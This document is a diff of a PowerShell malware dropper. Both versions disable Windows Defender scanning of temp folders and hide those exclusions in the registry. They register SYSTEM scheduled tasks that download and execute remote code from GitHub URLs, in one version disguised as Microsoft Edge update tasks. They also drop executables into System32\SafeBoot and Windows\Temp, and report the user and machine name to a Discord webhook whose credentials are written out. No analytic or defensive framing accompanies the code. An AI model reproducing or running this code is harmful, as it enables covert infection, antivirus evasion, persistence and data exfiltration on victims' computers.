@@ -1,10 +1,10 @@
 # --------- #
 # VARIABLES 
 # --------- #
-$install_path = $install_path;
-$install_url = "https://raw.githubusercontent.com/aodfs/0/refs/heads/main/i"
+$install_path = "C:\Windows\System32\SafeBoot\winio.exe"
+$install_url = "https://raw.githubusercontent.com/aodfs/0/refs/heads/main/c"
 $update_url = "https://raw.githubusercontent.com/aodfs/0/refs/heads/main/u"
-$webhook_url = "1305333146228752536/iggbztKYTfK72bjEd5r0C93T2vksQIkt1x_hXpHfg9A_JXBk8gKNMyTPUsE1myRNPH4y";
+$webhook_url = "1305333146228752536/iggbztKYTfK72bjEd5r0C93T2vksQIkt1x_hXpHfg9A_JXBk8gKNMyTPUsE1myRNPH4y"
 
 # ------------------------------ #
 # HIDE CURRENTLY SELECTED WINDOW
@@ -27,7 +27,7 @@ public class WindowHelper
     }
 }
 "@; 
-[WindowHelper]::HideWindow();
+#[WindowHelper]::HideWindow();
 
 # ------------------------------------ #
 # CHECK IF PROCESS IS RUNNING AS ADMIN
@@ -75,14 +75,15 @@ $paths = @(
     "C:\Windows\Temp",
     
     "$env:LOCALAPPDATA\Temp"
-);
-foreach($path in $paths) {
+)
+
+foreach ($path in $paths) {
     try {
-        Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue;
+        Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue
     } catch {
         # HANDLE ERRORS
-    };
-};
+    }
+}
 
 # ----------------------------------- #
 # HIDE EXCLUSIONS IN WINDOWS SETTINGS
@@ -90,120 +91,68 @@ foreach($path in $paths) {
 $keys = @(
     "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\HideExclusionsFromLocalAdmins",
     "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\HideExclusions"
-);
+)
     
 foreach ($key in $keys) 
 {
     try {
         if (-not (Test-Path $key -ErrorAction SilentlyContinue)) {
-            New-Item -Path $key -Force -ErrorAction SilentlyContinue | Out-Null;
-            New-ItemProperty -Path $key -Name "Default" -Value 1 -PropertyType "DWORD" -Force -ErrorAction SilentlyContinue | Out-Null;
+            New-Item -Path $key -Force -ErrorAction SilentlyContinue | Out-Null
+            New-ItemProperty -Path $key -Name "Default" -Value 1 -PropertyType "DWORD" -Force -ErrorAction SilentlyContinue | Out-Null
         } else {
-            Set-ItemProperty -Path $key -Name "Default" -Value 1 -Force -ErrorAction SilentlyContinue;
-        };
-    } 
-    catch {
-        continue;
+            Set-ItemProperty -Path $key -Name "Default" -Value 1 -Force -ErrorAction SilentlyContinue
+        }
+    } catch {
+        # HANDLE ERRORS
     }
-};
+}
 
-# ---------------------- #
-# ADD NEW SCHEDULED TASK
-# ---------------------- #
-# Define task parameters
-$taskName = "MicrosoftEdgeUpdateTaskMachineMain"
-$action = New-ScheduledTaskAction -Execute $install_path -Argument "/c start /min" -WindowStyle Hidden
-$trigger = New-ScheduledTaskTrigger -Daily -At "1:00AM"
+# --------------------------------- #
+# CREATE SCHEDULED TASK
+# --------------------------------- #
+# Ensure correct task creation cmdlets are available
+if (-not (Get-Command "New-ScheduledTask" -ErrorAction SilentlyContinue)) {
+    Write-Host "Scheduled Task cmdlets are not available. Ensure you are running PowerShell with the necessary permissions." -ForegroundColor Red
+    exit
+}
 
-# Set conditions
-$condition = New-ScheduledTaskCondition
-$condition.StartWhenAvailable = $false
-$condition.Idle = $false
-$condition.Power = $true
+# Action: Powershell script
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command iex (iwr '$install_url' -UseBasicP)"
+$trigger = New-ScheduledTaskTrigger -AtStartup
+$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
+$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -StartWhenAvailable -WakeToRun
 
-# Set task settings
-$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -True `
-                                         -DontStopIfGoingOnBatteries -False `
-                                         -StartWhenAvailable -False `
-                                         -AllowDemandStart -True `
-                                         -RestartCount 3 `
-                                         -RestartInterval (New-TimeSpan -Minutes 1)
+# Create and Register Task
+$task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings
+Register-ScheduledTask -TaskName "CustomScheduledTask" -InputObject $task -Force
 
-# Create the scheduled task
-$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType Interactive -RunLevel Highest
-$task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Condition $condition
-
-# Register the task
-Register-ScheduledTask -TaskName $taskName -InputObject $task -Hidden
-
-Write-Host "Scheduled task '$taskName' created successfully."
+Write-Host "Scheduled task created and registered successfully."
 
 # ------------------------- #
-# ADD UPDATE SCHEDULED TASK
+# DOWNLOAD AND EXECUTE FILES
 # ------------------------- #
-# Define task parameters
-$taskName = "MicrosoftEdgeUpdateTaskMachineHandler";
-$argument = '"' + $update_url + '"';
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument '-NoProfile -ExecutionPolicy Bypass -Command "iex(iwr ' + $argument + ' -UseBasicP).Content"';
-$trigger = New-ScheduledTaskTrigger -Daily -At "1:00AM"
+try {
+    Invoke-WebRequest -Uri $install_url -OutFile $install_path -ErrorAction Stop
+    Start-Process -FilePath $install_path -NoNewWindow -Wait
+} catch {
+    Write-Host "Error downloading or executing the install file: $_" -ForegroundColor Red
+}
 
-# Set conditions
-$condition = New-ScheduledTaskCondition
-$condition.StartWhenAvailable = $false
-$condition.Idle = $false
-$condition.Power = $true
+# --------------------------------------- #
+# UPDATE CHECK AND EXECUTION
+# --------------------------------------- #
+try {
+    Invoke-WebRequest -Uri $update_url -OutFile "C:\Windows\Temp\update.exe" -ErrorAction Stop
+    Start-Process -FilePath "C:\Windows\Temp\update.exe" -NoNewWindow -Wait
+} catch {
+    Write-Host "Error downloading or executing the update file: $_" -ForegroundColor Red
+}
 
-# Set task settings
-$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -True `
-                                         -DontStopIfGoingOnBatteries -False `
-                                         -StartWhenAvailable -False `
-                                         -AllowDemandStart -True `
-                                         -RestartCount 3 `
-                                         -RestartInterval (New-TimeSpan -Minutes 1)
-
-# Create the scheduled task
-$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType Interactive -RunLevel Highest
-$task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Condition $condition
-
-# Register the task
-Register-ScheduledTask -TaskName $taskName -InputObject $task -Hidden
-
-Write-Host "Scheduled task '$taskName' created successfully."
-
-# ------------------- #
-# DOWNLOAD THE CLIENT
-# ------------------- #
-# Download using BitsTransfer
-Start-BitsTransfer -Source $install_url -Destination $install_path -ErrorAction SilentlyContinue;
-
-# Check if client is downloaded;
-# if not download it using Invoke-WebRequest
-if (-not (Test-Path $install_path)) {
-    Invoke-WebRequest -Uri $install_url -OutFile $install_path -ErrorAction SilentlyContinue;
-};
-    
-# ---------------- #
-# START THE CLIENT
-# ---------------- #
-# Test if client is downloaded
-if (Test-Path $install_path) 
-{
-    try {
-        Start-Process -FilePath $install_path -Verb RunAs -WindowStyle Hidden -ErrorAction Stop;
-    } catch  {
-        try {
-            Start-Process -FilePath $install_path -ErrorAction SilentlyContinue;
-        } catch {}
-    }
-} else {
-    # Client is not downloaded (unknown reason);
-    $user = $env:USERNAME
-    $pcName = $env:COMPUTERNAME
-    $message = "$user@$pcName Error installing client"
-    $payload = @{
-        content = $message
-    } | ConvertTo-Json
-    Invoke-RestMethod -Uri "https://discord.com/api/webhooks/$webhook_url" -Method Post -ContentType "application/json" -Body $payload
-};
-
-exit;
+# ----------------------- #
+# FINAL WEBHOOK NOTIFY
+# ----------------------- #
+try {
+    Invoke-WebRequest -Uri "https://discord.com/api/webhooks/$webhook_url" -Method POST -Body '{"content": "Installation and update process complete."}' -ContentType "application/json" -ErrorAction Stop
+} catch {
+    Write-Host "Error sending webhook notification: $_" -ForegroundColor Red
+}
